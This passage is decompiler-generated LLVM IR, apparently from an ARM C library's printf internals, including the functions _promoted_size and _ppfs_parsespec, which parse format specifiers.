  %v2_fe04 = load i32, i32* %v1_fe04, align 4
  store i32 %v2_fe04, i32* %r2.global-to-local, align 4
  %v1_fe08 = add i32 %v3_fd90, 4
  store i32 %v1_fe08, i32* %r3.global-to-local, align 4
  store i32 %v1_fe08, i32* %v2_fd90, align 4
  %v0_fe10 = load i32, i32* %r2.global-to-local, align 4
  %v1_fe10 = load i32, i32* %ip.global-to-local, align 4
  %v2_fe10 = inttoptr i32 %v1_fe10 to i32*
  store i32 %v0_fe10, i32* %v2_fe10, align 4
  br label %dec_label_pc_fe40

dec_label_pc_fe18:                                ; preds = %dec_label_pc_fdb0, %dec_label_pc_fde8
  %v3_fe18 = load i32, i32* %v2_fd90, align 4
  store i32 %v3_fe18, i32* %r3.global-to-local, align 4
  %v1_fe1c = inttoptr i32 %v3_fe18 to i32*
  %v2_fe1c = load i32, i32* %v1_fe1c, align 4
  store i32 %v2_fe1c, i32* %r1.global-to-local, align 4
  %v3_fe1c = add i32 %v3_fe18, 4
  %v4_fe1c = inttoptr i32 %v3_fe1c to i32*
  %v5_fe1c = load i32, i32* %v4_fe1c, align 4
  store i32 %v5_fe1c, i32* %r2.global-to-local, align 4
  %v1_fe20 = add i32 %v3_fe18, 8
  store i32 %v1_fe20, i32* %r3.global-to-local, align 4
  store i32 %v1_fe20, i32* %v2_fd90, align 4
  %v0_fe28 = load i32, i32* %ip.global-to-local, align 4
  %v1_fe28 = inttoptr i32 %v0_fe28 to i32*
  %v2_fe28 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_fe28, i32* %v1_fe28, align 4
  %v3_fe28 = add i32 %v0_fe28, 4
  %v4_fe28 = inttoptr i32 %v3_fe28 to i32*
  %v5_fe28 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_fe28, i32* %v4_fe28, align 4
  br label %dec_label_pc_fe40

dec_label_pc_fe30:                                ; preds = %dec_label_pc_fdc4, %dec_label_pc_fdb0, %dec_label_pc_fda4, %dec_label_pc_fde8
  %v1_fe30 = add i32 %v3_fd90, 4
  store i32 %v1_fe30, i32* %r3.global-to-local, align 4
  store i32 %v1_fe30, i32* %v2_fd90, align 4
  %v0_fe38 = load i32, i32* %r1.global-to-local, align 4
  %v1_fe38 = inttoptr i32 %v0_fe38 to i32*
  %v2_fe38 = load i32, i32* %v1_fe38, align 4
  store i32 %v2_fe38, i32* %r3.global-to-local, align 4
  %v1_fe3c = load i32, i32* %ip.global-to-local, align 4
  %v2_fe3c = inttoptr i32 %v1_fe3c to i32*
  store i32 %v2_fe38, i32* %v2_fe3c, align 4
  br label %dec_label_pc_fe40

dec_label_pc_fe40:                                ; preds = %dec_label_pc_fe18, %dec_label_pc_fe04, %dec_label_pc_fdf0, %dec_label_pc_fe30
  %v0_fe40 = load i32, i32* %ip.global-to-local, align 4
  %v1_fe40 = add i32 %v0_fe40, 8
  store i32 %v1_fe40, i32* %ip.global-to-local, align 4
  %v0_fe44.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_fe48.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_fe44

dec_label_pc_fe44:                                ; preds = %dec_label_pc_fd80, %dec_label_pc_fe40
  %v0_fe48 = phi i32 [ %v0_fe4825, %dec_label_pc_fd80 ], [ %v0_fe48.pre, %dec_label_pc_fe40 ]
  %v0_fe44 = phi i32 [ %v1_fd8024, %dec_label_pc_fd80 ], [ %v0_fe44.pre, %dec_label_pc_fe40 ]
  %v1_fe44 = add i32 %v0_fe44, 1
  store i32 %v1_fe44, i32* %lr.global-to-local, align 4
  %v1_fe48 = add i32 %v0_fe48, 28
  %v2_fe48 = inttoptr i32 %v1_fe48 to i32*
  %v3_fe48 = load i32, i32* %v2_fe48, align 4
  store i32 %v3_fe48, i32* %r3.global-to-local, align 4
  %v5_fe50 = icmp slt i32 %v1_fe44, %v3_fe48
  br i1 %v5_fe50, label %dec_label_pc_fd80, label %dec_label_pc_fe48.dec_label_pc_fe54.loopexit_crit_edge

dec_label_pc_fe58:                                ; preds = %entry
  br i1 %v6_fd34, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_fe58
  %v2_fe5c = add i32 %v0_fd1c, 36
  %v3_fe5c = inttoptr i32 %v2_fe5c to i8*
  %v4_fe5c = load i8, i8* %v3_fe5c, align 1
  %v5_fe5c = zext i8 %v4_fe5c to i32
  %v5_fe60 = mul nuw nsw i32 %v5_fe5c, 8
  %v6_fe60 = add i32 %v5_fe60, %v1_fd28
  store i32 %v6_fe60, i32* %r3.global-to-local, align 4
  %v2_fe64 = add i32 %v6_fe60, -8
  %v3_fe64 = inttoptr i32 %v2_fe64 to i32*
  %v4_fe64 = load i32, i32* %v3_fe64, align 4
  store i32 %v4_fe64, i32* %r3.global-to-local, align 4
  store i32 %v4_fe64, i32* %v2_fd2c, align 4
  %v0_fe6c.pre = load i32, i32* @r0, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_fe58, %bb
  %v2_fe80 = phi i32 [ %v0_fe6c.pre, %bb ], [ %v0_fd1c, %dec_label_pc_fe58 ]
  %v1_fe6c = add i32 %v2_fe80, 4
  %v2_fe6c = inttoptr i32 %v1_fe6c to i32*
  %v3_fe6c = load i32, i32* %v2_fe6c, align 4
  store i32 %v3_fe6c, i32* %r3.global-to-local, align 4
  %v6_fe70 = icmp eq i32 %v3_fe6c, -2147483648
  br i1 %v6_fe70, label %bb15, label %dec_label_pc_fe54

bb15:                                             ; preds = %.thread2
  %v2_fe74 = add i32 %v2_fe80, 37
  %v3_fe74 = inttoptr i32 %v2_fe74 to i8*
  %v4_fe74 = load i8, i8* %v3_fe74, align 1
  %v5_fe74 = zext i8 %v4_fe74 to i32
  %v1_fe78 = load i32, i32* %ip.global-to-local, align 4
  %v5_fe78 = mul nuw nsw i32 %v5_fe74, 8
  %v6_fe78 = add i32 %v5_fe78, %v1_fe78
  store i32 %v6_fe78, i32* %r3.global-to-local, align 4
  %v2_fe7c = add i32 %v6_fe78, -8
  %v3_fe7c = inttoptr i32 %v2_fe7c to i32*
  %v4_fe7c = load i32, i32* %v3_fe7c, align 4
  store i32 %v4_fe7c, i32* %r3.global-to-local, align 4
  store i32 %v4_fe7c, i32* %v2_fe6c, align 4
  %v0_fe84.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_fe54

dec_label_pc_fe48.dec_label_pc_fe54.loopexit_crit_edge: ; preds = %dec_label_pc_fe44
  br label %dec_label_pc_fe54.loopexit

dec_label_pc_fe54.loopexit:                       ; preds = %dec_label_pc_fe48.dec_label_pc_fe54.loopexit_crit_edge, %dec_label_pc_fd78
  %v0_fe48.lcssa = phi i32 [ %v0_fe48, %dec_label_pc_fe48.dec_label_pc_fe54.loopexit_crit_edge ], [ %v0_fe4818, %dec_label_pc_fd78 ]
  br label %dec_label_pc_fe54

dec_label_pc_fe54:                                ; preds = %dec_label_pc_fe54.loopexit, %.thread2, %bb15
  %v1_fea4 = phi i32 [ %v0_fe48.lcssa, %dec_label_pc_fe54.loopexit ], [ %v2_fe80, %.thread2 ], [ %v0_fe84.pre, %bb15 ]
  %v1_fe84 = add i32 %v1_fea4, 8
  %v2_fe84 = inttoptr i32 %v1_fe84 to i32*
  %v3_fe84 = load i32, i32* %v2_fe84, align 4
  store i32 %v3_fe84, i32* %r1.global-to-local, align 4
  %v1_fe88 = icmp slt i32 %v3_fe84, 0
  br i1 %v1_fe88, label %bb17, label %bb16

bb16:                                             ; preds = %dec_label_pc_fe54
  %v5_fe8c = load i32, i32* %stack_var_-8, align 4
  store i32 %v5_fe8c, i32* @r4, align 4
  ret i32 %v1_fea4

bb17:                                             ; preds = %dec_label_pc_fe54
  %v1_fe90 = add i32 %v1_fea4, 16
  %v2_fe90 = inttoptr i32 %v1_fe90 to i32*
  %v3_fe90 = load i32, i32* %v2_fe90, align 4
  %v1_fe98 = sub i32 0, %v3_fe84
  store i32 %v1_fe98, i32* %r1.global-to-local, align 4
  %v1_fe94 = and i32 %v3_fe90, -10
  %v1_fe9c = or i32 %v1_fe94, 8
  store i32 %v1_fe9c, i32* %r3.global-to-local, align 4
  store i32 32, i32* %r2.global-to-local, align 4
  %v2_fea4 = add i32 %v1_fea4, 20
  %v3_fea4 = inttoptr i32 %v2_fea4 to i32*
  store i32 32, i32* %v3_fea4, align 4
  %v0_fea8 = load i32, i32* %r1.global-to-local, align 4
  %v1_fea8 = load i32, i32* @r0, align 4
  %v2_fea8 = add i32 %v1_fea8, 8
  %v3_fea8 = inttoptr i32 %v2_fea8 to i32*
  store i32 %v0_fea8, i32* %v3_fea8, align 4
  %v0_feac = load i32, i32* %r3.global-to-local, align 4
  %v1_feac = load i32, i32* @r0, align 4
  %v2_feac = add i32 %v1_feac, 16
  %v3_feac = inttoptr i32 %v2_feac to i32*
  store i32 %v0_feac, i32* %v3_feac, align 4
  %v2_feb0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_feb0, i32* @r4, align 4
  %v8_feb0 = load i32, i32* @r0, align 4
  ret i32 %v8_feb0

; uselistorder directives
  uselistorder i32 %v1_fe44, { 2, 1, 0 }
  uselistorder i32 %v0_fe48, { 1, 2, 0 }
  uselistorder i32 %v3_fe18, { 0, 2, 1, 3 }
  uselistorder i32 %v3_fd90, { 3, 1, 0, 2, 4 }
  uselistorder i32* %v2_fd90, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 %v3_fd84, { 1, 2, 0, 8, 5, 3, 4, 7, 6, 9, 10, 11 }
  uselistorder i32 %v1_fd8024, { 1, 0 }
  uselistorder i32 %v0_fe4818, { 2, 0, 1 }
  uselistorder i32 %v0_fd1c, { 0, 3, 1, 2, 5, 4, 6 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 17, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 18, 19, 20, 21, 22, 23 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9 }
  uselistorder i32* %lr.global-to-local, { 2, 1, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 37, { 2, 3, 0, 1, 4 }
  uselistorder i32 80, { 2, 3, 4, 0, 1, 5 }
  uselistorder label %dec_label_pc_fe54, { 0, 2, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_fe44, { 1, 0 }
  uselistorder label %dec_label_pc_fe40, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_fe30, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_fe18, { 1, 0 }
  uselistorder label %dec_label_pc_fe04, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_fd80, { 1, 0 }
  uselistorder label %dec_label_pc_fd78, { 1, 0 }
  uselistorder label %dec_label_pc_fd54, { 1, 0 }
}

define i32 @_promoted_size() local_unnamed_addr {
entry:
  %v1_fed0.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_febc

dec_label_pc_febc:                                ; preds = %dec_label_pc_fed8, %entry
  %v0_febc = phi i32 [ %v1_febc, %dec_label_pc_fed8 ], [ ptrtoint (i32* @global_var_1290c.363 to i32), %entry ]
  %v1_febc = add i32 %v0_febc, -2
  %v1_fec0 = add i32 %v0_febc, -1
  %v2_fec0 = inttoptr i32 %v1_fec0 to i8*
  %v3_fec0 = load i8, i8* %v2_fec0, align 1
  %v4_fec0 = zext i8 %v3_fec0 to i32
  %v1_fec4 = inttoptr i32 %v1_febc to i8*
  %v2_fec4 = load i8, i8* %v1_fec4, align 2
  %v3_fec4 = zext i8 %v2_fec4 to i32
  %v3_fec8 = mul nuw i32 %v4_fec0, 16777216
  %v4_fecc = sdiv i32 %v3_fec8, 65536
  %v5_fecc = or i32 %v4_fecc, %v3_fec4
  %v9_fed0 = icmp eq i32 %v5_fecc, %v1_fed0.pre
  br i1 %v9_fed0, label %dec_label_pc_febc.dec_label_pc_fee4_crit_edge, label %dec_label_pc_fed8

dec_label_pc_febc.dec_label_pc_fee4_crit_edge:    ; preds = %dec_label_pc_febc
  br label %dec_label_pc_fee4

dec_label_pc_fed8:                                ; preds = %dec_label_pc_febc
  %tmp = icmp ugt i32 %v1_febc, ptrtoint (i32* @global_var_128f4.365 to i32)
  br i1 %tmp, label %dec_label_pc_febc, label %dec_label_pc_fee4

dec_label_pc_fee4:                                ; preds = %dec_label_pc_fed8, %dec_label_pc_febc.dec_label_pc_fee4_crit_edge
  %v2_feec.pre-phi = sub i32 %v1_febc, ptrtoint (i32* @global_var_128f4.365 to i32)
  store i32 ptrtoint (i32* @global_var_1290c.363 to i32), i32* @r2, align 4
  %v4_fef0 = sdiv i32 %v2_feec.pre-phi, 2
  %v5_fef0 = add i32 %v4_fef0, ptrtoint (i32* @global_var_1290c.363 to i32)
  %v6_fef0 = inttoptr i32 %v5_fef0 to i8*
  %v7_fef0 = load i8, i8* %v6_fef0, align 1
  %v9_fef0 = zext i8 %v7_fef0 to i32
  ret i32 %v9_fef0

; uselistorder directives
  uselistorder i32 %v1_febc, { 0, 1, 3, 2 }
  uselistorder i32 %v0_febc, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1290c.363 to i32), { 1, 2, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %tmp106 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-87 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_ff04 = load i32, i32* @r4, align 4
  store i32 %v3_ff04, i32* %stack_var_-32, align 4
  %v6_ff04 = load i32, i32* @r5, align 4
  %v25_ff04 = ptrtoint i32* %stack_var_-32 to i32
  %v1_ff08 = add i32 %tmp, 16
  %v2_ff08 = inttoptr i32 %v1_ff08 to i32*
  %v3_ff08 = load i32, i32* %v2_ff08, align 4
  %v2_ff0c = ptrtoint i32* %stack_var_-88 to i32
  %v1_ff10 = and i32 %v3_ff08, 128
  store i32 %v1_ff10, i32* @r4, align 4
  %v2_ff10 = icmp eq i32 %v1_ff10, 0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r7.global-to-local, align 4
  %v1_ff30 = add i32 %tmp, 24
  %v2_ff30 = inttoptr i32 %v1_ff30 to i32*
  %v3_ff30 = load i32, i32* %v2_ff30, align 4
  store i32 %v3_ff30, i32* %sb.global-to-local, align 4
  br i1 %v2_ff10, label %bb, label %dec_label_pc_ff50

bb:                                               ; preds = %entry
  %v3_ff34 = load i32, i32* %arg1, align 4
  br label %dec_label_pc_ff9c

dec_label_pc_ff40:                                ; preds = %dec_label_pc_10120
  %v0_ff40 = load i32, i32* %r0.global-to-local, align 4
  %v0_10150.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10148

dec_label_pc_ff48:                                ; preds = %dec_label_pc_1014c
  %v1_ff48 = add i32 %v0_10150.pre, 1
  store i32 %v1_ff48, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10168

dec_label_pc_ff50:                                ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ff54

dec_label_pc_ff54:                                ; preds = %dec_label_pc_ff88.dec_label_pc_ff54_crit_edge, %dec_label_pc_ff50
  %v1_ff64 = phi i32 [ %v1_ff78, %dec_label_pc_ff88.dec_label_pc_ff54_crit_edge ], [ 0, %dec_label_pc_ff50 ]
  %v0_ff54 = phi i32 [ %v0_ff54.pre, %dec_label_pc_ff88.dec_label_pc_ff54_crit_edge ], [ %tmp, %dec_label_pc_ff50 ]
  %v1_ff54 = inttoptr i32 %v0_ff54 to i32*
  %v2_ff54 = load i32, i32* %v1_ff54, align 4
  %v4_ff58 = mul i32 %v1_ff64, 4
  %v5_ff58 = add i32 %v2_ff54, %v4_ff58
  store i32 %v5_ff58, i32* %r3.global-to-local, align 4
  %v1_ff5c = add i32 %v5_ff58, -4
  %v2_ff5c = inttoptr i32 %v1_ff5c to i32*
  %v3_ff5c = load i32, i32* %v2_ff5c, align 4
  store i32 %v3_ff5c, i32* %r1.global-to-local, align 4
  store i32 %v25_ff04, i32* %ip.global-to-local, align 4
  %v2_ff64 = add i32 %v1_ff64, %v25_ff04
  store i32 %v2_ff64, i32* %r2.global-to-local, align 4
  %v1_ff68 = trunc i32 %v3_ff5c to i8
  %v3_ff68 = add i32 %v2_ff64, -56
  %v4_ff68 = inttoptr i32 %v3_ff68 to i8*
  store i8 %v1_ff68, i8* %v4_ff68, align 1
  %v0_ff6c = load i32, i32* %r2.global-to-local, align 4
  %v1_ff6c = add i32 %v0_ff6c, -56
  %v2_ff6c = inttoptr i32 %v1_ff6c to i8*
  %v3_ff6c = load i8, i8* %v2_ff6c, align 1
  %v4_ff6c = zext i8 %v3_ff6c to i32
  store i32 %v4_ff6c, i32* %r2.global-to-local, align 4
  %v0_ff70 = load i32, i32* %r3.global-to-local, align 4
  %v1_ff70 = add i32 %v0_ff70, -4
  %v2_ff70 = inttoptr i32 %v1_ff70 to i32*
  %v3_ff70 = load i32, i32* %v2_ff70, align 4
  store i32 %v3_ff70, i32* %r3.global-to-local, align 4
  %v9_ff74 = icmp eq i32 %v4_ff6c, %v3_ff70
  %v0_ff78 = load i32, i32* %r0.global-to-local, align 4
  %v1_ff78 = add i32 %v0_ff78, 1
  store i32 %v1_ff78, i32* %r0.global-to-local, align 4
  br i1 %v9_ff74, label %dec_label_pc_ff80, label %dec_label_pc_10398

dec_label_pc_ff80:                                ; preds = %dec_label_pc_ff54
  %v2_ff80 = icmp eq i8 %v3_ff6c, 0
  br i1 %v2_ff80, label %dec_label_pc_ff90, label %dec_label_pc_ff88

dec_label_pc_ff88:                                ; preds = %dec_label_pc_ff80
  %tmp166 = icmp ult i32 %v1_ff78, 32
  br i1 %tmp166, label %dec_label_pc_ff88.dec_label_pc_ff54_crit_edge, label %dec_label_pc_ff90

dec_label_pc_ff88.dec_label_pc_ff54_crit_edge:    ; preds = %dec_label_pc_ff88
  %v0_ff54.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_ff54

dec_label_pc_ff90:                                ; preds = %dec_label_pc_ff88, %dec_label_pc_ff80
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_ff98 = ptrtoint i32* %stack_var_-87 to i32
  br label %dec_label_pc_ff9c

dec_label_pc_ff9c:                                ; preds = %bb, %dec_label_pc_ff90
  %storemerge102 = phi i32 [ %v2_ff98, %dec_label_pc_ff90 ], [ %v3_ff34, %bb ]
  store i32 %storemerge102, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_ffac

dec_label_pc_ffa8:                                ; preds = %.thread22, %dec_label_pc_100b8
  %v0_ffa8 = phi i32 [ %v2_10130, %.thread22 ], [ %storemerge105, %dec_label_pc_100b8 ]
  %stack_var_-48.0 = phi i32 [ %stack_var_-48.3, %.thread22 ], [ %stack_var_-48.2, %dec_label_pc_100b8 ]
  store i32 %v0_ffa8, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_ffac

dec_label_pc_ffac:                                ; preds = %dec_label_pc_ff9c, %dec_label_pc_ffa8
  %v1_ffc8 = phi i32 [ %storemerge102, %dec_label_pc_ff9c ], [ %v0_ffa8, %dec_label_pc_ffa8 ]
  %stack_var_-48.1 = phi i32 [ %tmp106, %dec_label_pc_ff9c ], [ %stack_var_-48.0, %dec_label_pc_ffa8 ]
  %v1_ffac = inttoptr i32 %v1_ffc8 to i8*
  %v2_ffac = load i8, i8* %v1_ffac, align 1
  %v3_ffac = zext i8 %v2_ffac to i32
  store i32 %v3_ffac, i32* %r3.global-to-local, align 4
  %v7_ffb0 = icmp eq i8 %v2_ffac, 42
  br i1 %v7_ffb0, label %bb124, label %.thread9.thread

.thread9.thread:                                  ; preds = %dec_label_pc_ffac
  store i32 %v1_ffc8, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.preheader

bb124:                                            ; preds = %dec_label_pc_ffac
  %v1_ffbc = load i32, i32* @lr, align 4
  %v4_ffbc = mul i32 %v1_ffbc, -4
  %v5_ffbc = add i32 %v4_ffbc, %v25_ff04
  store i32 %v5_ffbc, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_ffc8 = add i32 %v1_ffc8, 1
  store i32 %v2_ffc8, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_ffd0 = add i32 %v5_ffbc, -12
  %v4_ffd0 = inttoptr i32 %v3_ffd0 to i32*
  store i32 0, i32* %v4_ffd0, align 4
  %v0_fff4.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb124, %.thread9.thread
  %v0_fff4.pre = phi i32 [ %v0_fff4.pre.pre, %bb124 ], [ %v1_ffc8, %.thread9.thread ]
  %v2_fff8.pre = load i32, i32* @global_var_1b514, align 4
  br label %.backedge

dec_label_pc_ffd8:                                ; preds = %.backedge
  store i32 4094, i32* %r3.global-to-local, align 4
  %v0_ffdc = load i32, i32* %r0.global-to-local, align 4
  %v7_ffe0 = icmp sgt i32 %v0_ffdc, 4094
  br i1 %v7_ffe0, label %.thread12, label %bb126

.thread12:                                        ; preds = %dec_label_pc_ffd8
  %v1_ffe814 = add i32 %v0_1006c, 1
  store i32 %v1_ffe814, i32* %r6.global-to-local, align 4
  br label %.backedge

bb126:                                            ; preds = %dec_label_pc_ffd8
  %v11_ffe4 = mul i32 %v0_ffdc, 10
  %v12_ffe4 = add i32 %v11_ffe4, %v3_fff4
  store i32 %v12_ffe4, i32* %r3.global-to-local, align 4
  %v1_ffe8 = add i32 %v0_1006c, 1
  store i32 %v1_ffe8, i32* %r6.global-to-local, align 4
  %v9_ffec = add i32 %v12_ffe4, -48
  store i32 %v9_ffec, i32* %r0.global-to-local, align 4
  br label %.backedge

.backedge:                                        ; preds = %.thread12, %bb126, %.preheader
  %v0_1006c = phi i32 [ %v0_fff4.pre, %.preheader ], [ %v1_ffe8, %bb126 ], [ %v1_ffe814, %.thread12 ]
  store i32 ptrtoint (i32* @global_var_1b514 to i32), i32* %r3.global-to-local, align 4
  %v1_fff4 = inttoptr i32 %v0_1006c to i8*
  %v2_fff4 = load i8, i8* %v1_fff4, align 1
  %v3_fff4 = zext i8 %v2_fff4 to i32
  store i32 %v3_fff4, i32* %r2.global-to-local, align 4
  store i32 %v2_fff8.pre, i32* %r3.global-to-local, align 4
  %v3_fffc = mul nuw nsw i32 %v3_fff4, 2
  %v4_fffc = add i32 %v3_fffc, %v2_fff8.pre
  %v5_fffc = inttoptr i32 %v4_fffc to i8*
  %v6_fffc = load i8, i8* %v5_fffc, align 1
  %v8_fffc = zext i8 %v6_fffc to i32
  store i32 %v8_fffc, i32* %r3.global-to-local, align 4
  %v1_10000 = and i32 %v8_fffc, 8
  %v2_10000 = icmp eq i32 %v1_10000, 0
  br i1 %v2_10000, label %dec_label_pc_10008, label %dec_label_pc_ffd8

dec_label_pc_10008:                               ; preds = %.backedge
  %v0_10008 = load i32, i32* %r1.global-to-local, align 4
  %v1_10008 = add i32 %v0_10008, -1
  %v2_10008 = inttoptr i32 %v1_10008 to i8*
  %v3_10008 = load i8, i8* %v2_10008, align 1
  %v4_10008 = zext i8 %v3_10008 to i32
  store i32 %v4_10008, i32* %r3.global-to-local, align 4
  %v7_1000c = icmp eq i8 %v3_10008, 37
  br i1 %v7_1000c, label %dec_label_pc_10014, label %dec_label_pc_100d0

dec_label_pc_10014:                               ; preds = %dec_label_pc_10008
  %v7_10014 = icmp eq i8 %v2_fff4, 36
  %. = zext i1 %v7_10014 to i32
  store i32 %., i32* %ip.global-to-local, align 4
  %v0_10020 = load i32, i32* %r0.global-to-local, align 4
  %tmp129 = icmp slt i32 %v0_10020, 1
  br i1 %tmp129, label %bb130, label %thread-pre-split

bb130:                                            ; preds = %dec_label_pc_10014
  store i32 0, i32* %ip.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_10014, %bb130
  %v1_1007c = phi i32 [ 0, %bb130 ], [ %., %dec_label_pc_10014 ]
  %v2_10028 = icmp eq i32 %v1_1007c, 0
  %v0_10058 = load i32, i32* %sb.global-to-local, align 4
  br i1 %v2_10028, label %dec_label_pc_10058, label %dec_label_pc_10030

dec_label_pc_10030:                               ; preds = %thread-pre-split
  %v2_10058 = icmp eq i32 %v0_10058, 0
  %v1_10034 = add i32 %v0_1006c, 1
  store i32 %v1_10034, i32* %r1.global-to-local, align 4
  br i1 %v2_10058, label %dec_label_pc_10398, label %dec_label_pc_1003c

dec_label_pc_1003c:                               ; preds = %dec_label_pc_10030
  %v2_1003c = sub i32 %v0_10020, %v0_10058
  %v4_1003c = xor i32 %v0_10058, %v0_10020
  %v5_1003c = xor i32 %v2_1003c, %v0_10020
  %v6_1003c = and i32 %v5_1003c, %v4_1003c
  %v7_1003c = icmp slt i32 %v6_1003c, 0
  %v8_1003c = icmp slt i32 %v2_1003c, 0
  %v9_1003c = icmp eq i32 %v0_10020, %v0_10058
  %v3_10040 = xor i1 %v8_1003c, %v7_1003c
  %v4_10040 = or i1 %v9_1003c, %v3_10040
  br i1 %v4_10040, label %dec_label_pc_10050, label %bb131

bb131:                                            ; preds = %dec_label_pc_1003c
  store i32 %v0_10020, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_10050

dec_label_pc_1004c:                               ; preds = %dec_label_pc_1006c, %dec_label_pc_10074
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_10050

dec_label_pc_10050:                               ; preds = %bb131, %dec_label_pc_1003c, %dec_label_pc_1004c
  %v0_10050 = phi i32 [ %v0_10008, %dec_label_pc_1004c ], [ %v1_10034, %dec_label_pc_1003c ], [ %v1_10034, %bb131 ]
  %stack_var_-48.2 = phi i32 [ %stack_var_-48.1, %dec_label_pc_1004c ], [ %v0_10020, %dec_label_pc_1003c ], [ %v0_10020, %bb131 ]
  br label %dec_label_pc_10088

dec_label_pc_10058:                               ; preds = %thread-pre-split
  %tmp132 = icmp slt i32 %v0_10058, 1
  br i1 %tmp132, label %dec_label_pc_1006c, label %dec_label_pc_10060

dec_label_pc_10060:                               ; preds = %dec_label_pc_10058
  %v7_10060 = icmp eq i8 %v2_fff4, 109
  br i1 %v7_10060, label %dec_label_pc_100d0, label %dec_label_pc_10398

dec_label_pc_1006c:                               ; preds = %dec_label_pc_10058
  %tmp167 = icmp ugt i32 %v0_1006c, %v0_10008
  br i1 %tmp167, label %dec_label_pc_10074, label %dec_label_pc_1004c

dec_label_pc_10074:                               ; preds = %dec_label_pc_1006c
  %v1_10074 = inttoptr i32 %v0_10008 to i8*
  %v2_10074 = load i8, i8* %v1_10074, align 1
  %v3_10074 = zext i8 %v2_10074 to i32
  store i32 %v3_10074, i32* %r3.global-to-local, align 4
  %v7_10078 = icmp eq i8 %v2_10074, 48
  br i1 %v7_10078, label %dec_label_pc_1004c, label %bb133

bb133:                                            ; preds = %dec_label_pc_10074
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_100d0

dec_label_pc_10088.loopexit:                      ; preds = %dec_label_pc_10090
  %v1_1009c = load i32, i32* @r4, align 4
  %v3_1009c = or i32 %v1_1009c, %v0_100b0
  store i32 %v3_1009c, i32* @r4, align 4
  %v2_100a0 = add i32 %storemerge105, 1
  br label %dec_label_pc_10088

dec_label_pc_10088:                               ; preds = %dec_label_pc_10088.loopexit, %dec_label_pc_10050
  %storemerge105 = phi i32 [ %v0_10050, %dec_label_pc_10050 ], [ %v2_100a0, %dec_label_pc_10088.loopexit ]
  store i32 %storemerge105, i32* %r6.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_128ec.369 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_10094 = inttoptr i32 %storemerge105 to i8*
  br label %dec_label_pc_10090

dec_label_pc_10090:                               ; preds = %dec_label_pc_100a8, %dec_label_pc_10088
  %v0_100b0 = phi i32 [ %v2_100b0, %dec_label_pc_100a8 ], [ 1, %dec_label_pc_10088 ]
  %v0_10090 = phi i32 [ %v5_10090, %dec_label_pc_100a8 ], [ ptrtoint ([8 x i8]* @global_var_128ec.369 to i32), %dec_label_pc_10088 ]
  %v1_10090 = inttoptr i32 %v0_10090 to i8*
  %v2_10090 = load i8, i8* %v1_10090, align 1
  %v3_10090 = zext i8 %v2_10090 to i32
  store i32 %v3_10090, i32* %r2.global-to-local, align 4
  %v5_10090 = add i32 %v0_10090, 1
  store i32 %v5_10090, i32* %r1.global-to-local, align 4
  %v2_10094 = load i8, i8* %v1_10094, align 1
  %v3_10094 = zext i8 %v2_10094 to i32
  store i32 %v3_10094, i32* %r3.global-to-local, align 4
  %v9_10098 = icmp eq i8 %v2_10094, %v2_10090
  br i1 %v9_10098, label %dec_label_pc_10088.loopexit, label %dec_label_pc_100a8

dec_label_pc_100a8:                               ; preds = %dec_label_pc_10090
  %v1_100a8 = inttoptr i32 %v5_10090 to i8*
